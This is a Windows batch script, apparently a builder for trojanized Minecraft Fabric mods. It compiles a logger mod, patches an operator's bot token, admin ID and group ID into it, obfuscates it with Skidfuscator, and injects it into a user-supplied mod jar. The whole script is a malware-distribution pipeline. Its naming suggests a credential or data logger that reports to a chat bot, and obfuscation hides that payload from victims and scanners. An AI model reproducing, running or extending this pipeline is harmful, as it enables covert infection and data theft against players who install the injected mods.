@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul
cd /d "%~dp0"

set "JAVA_HOME=C:\Program Files\Java\jdk-21"
set "JAVASSIST_JAR=D:\logger\libs\javassist.jar"
set "RT_JAR=C:\Program Files\Java\jdk1.8.0_202\jre\lib\rt.jar"
set "LIBS_DIR=%~dp0libs_runtime"
set "MOD_JAR=build\libs\modkalogger-fabric-1.0.0.jar"
set "OBF_JAR=build\libs\modkalogger-obf.jar"

if "%~1"=="" goto usage

set "INPUT=%~1"
set "OUTPUT=%~2"
if "%OUTPUT%"=="" set "OUTPUT=delta_injected.jar"
set "BOT_TOKEN=%~3"
set "ADMIN_ID=%~4"
set "GROUP_ID=%~5"

echo ============================================
echo   ModKaLogger Fabric Injector v4.2 AutoPipeline
echo ============================================
if "%GROUP_ID%"=="" (
    echo [i] group_id not provided - sending to personal chat only
)
echo Input:  %INPUT%
echo Output: %OUTPUT%
echo.

echo [1/5] Building modkalogger (clean)...
pushd "%~dp0"
if exist "build\libs\modkalogger-fabric-1.0.0.jar" del /q "build\libs\modkalogger-fabric-1.0.0.jar"
if exist "build\libs\modkalogger-fabric-1.0.0-sources.jar" del /q "build\libs\modkalogger-fabric-1.0.0-sources.jar"
if exist "build\libs\modkalogger-obf.jar" del /q "build\libs\modkalogger-obf.jar"
if exist "build\libs\modkalogger-fabric-1.0.0.jar.patched" del /q "build\libs\modkalogger-fabric-1.0.0.jar.patched"
call gradlew.bat build -q --no-daemon
if errorlevel 1 goto fail
if not exist "build\libs\modkalogger-fabric-1.0.0.jar" (
    echo [ERROR] Build did not produce the mod jar
    goto fail
)
popd
echo.

echo [2/5] Injecting token/admin/group into CoreBootstrap...
javac -source 8 -target 8 -encoding UTF-8 -cp "%JAVASSIST_JAR%" TokenPatcher.java 2>nul
java -cp ".;%JAVASSIST_JAR%" TokenPatcher "%MOD_JAR%" "%BOT_TOKEN%" "%ADMIN_ID%" "%GROUP_ID%" "%MOD_JAR%.patched"
if errorlevel 1 (
    echo [ERROR] TokenPatch failed
    goto fail
)
if not exist "%MOD_JAR%.patched" (
    echo [ERROR] TokenPatch output missing
    goto fail
)
move /y "%MOD_JAR%.patched" "%MOD_JAR%" >nul
if errorlevel 1 (
    echo [ERROR] TokenPatch move failed
    goto fail
)
echo.

echo [3/5] Obfuscating with Skidfuscator...
java -Xmx4G -jar skidfuscator.jar obfuscate -cfg config.hocon -rt "%RT_JAR%" -li "%LIBS_DIR%" -o "%OBF_JAR%" "%MOD_JAR%"
if errorlevel 1 (
    echo [ERROR] Obfuscation failed
    goto fail
)
echo.

echo [4/5] Compiling FabricInjector + MixinFixer...
javac -source 8 -target 8 -encoding UTF-8 -cp "%JAVASSIST_JAR%" FabricInjector.java MixinFixer.java 2>nul
echo.

echo [5/5] Injecting obfuscated mod into %INPUT%...
java -cp ".;%JAVASSIST_JAR%" FabricInjector "%INPUT%" "%OUTPUT%" "%OBF_JAR%"
if errorlevel 1 (
    echo [ERROR] Injection failed
    goto fail
)

java -cp ".;%JAVASSIST_JAR%" MixinFixer "%OUTPUT%"
echo.
echo [+] DONE: %OUTPUT%
if not "%~6"=="nopause" pause
exit /b 0

:usage
echo Usage: inject.bat ^<input.jar^> [output.jar] [bot_token] [admin_id] [group_id]
exit /b 1

:fail
echo [ERROR] Pipeline failed.
if not "%~6"=="nopause" pause
exit /b 1